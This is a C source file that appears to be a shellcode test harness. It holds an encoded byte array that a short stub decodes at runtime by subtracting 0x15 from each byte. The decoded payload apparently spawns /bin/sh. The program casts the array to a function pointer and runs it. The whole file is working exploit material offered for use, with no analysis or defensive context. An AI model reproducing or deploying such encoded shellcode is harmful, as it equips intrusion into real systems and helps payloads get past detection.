#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x09\x5e\x80\x2e\x15\x75\x08\x46\xeb\xf8\xe8\xf2\xff\xff\xff\x46\xd5\x65\x9e\xf7\x7d\x44\x44\x88\x7d\x7d\x44\x77\x7e\x83\x9e\xf8\x65\xc5\x20\x95";

int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	